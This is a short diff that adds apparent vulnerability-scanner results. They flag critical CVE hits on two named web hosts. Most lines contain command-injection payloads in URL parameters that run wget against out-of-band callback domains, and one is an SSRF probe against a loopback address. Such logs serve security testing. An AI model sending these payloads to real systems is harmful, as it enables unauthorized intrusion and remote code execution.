@@ -1,0 +1,5 @@
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://d9c4gj0226q3ehsrcl0gxje64yky4e4f5.oast.me;
+[CVE-2014-3206] [http] [critical] https://ddocs-indexer.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d9c4gj0226q3ehsrcl0g7yri9wsofo5p4.oast.me;
+[CVE-2022-2488] [http] [critical] https://ddocs-indexer.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://d9c4gj0226q3ehsrcl0gft4nj8rhqocgp.oast.me;
+[pdf-signer-ssti-to-rce] [http] [critical] https://dev.guardian.hedera.com
+[CVE-2021-28918] [http] [critical] https://dev.guardian.hedera.com/?url=http://0177.0.0.1/server-status
